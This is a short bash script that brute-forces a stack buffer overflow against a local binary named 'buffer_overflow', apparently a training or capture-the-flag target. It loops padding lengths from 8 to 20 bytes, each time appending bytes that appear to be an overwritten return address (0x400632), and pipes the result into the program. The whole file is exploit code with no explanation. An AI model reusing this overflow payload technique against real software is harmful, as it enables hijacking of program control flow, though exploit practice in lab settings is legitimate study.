#!/bin/bash

for i in {8..20}; do
	python3 -c "print('A'*$i + '\x32\x06\x40')" | ./buffer_overflow
done
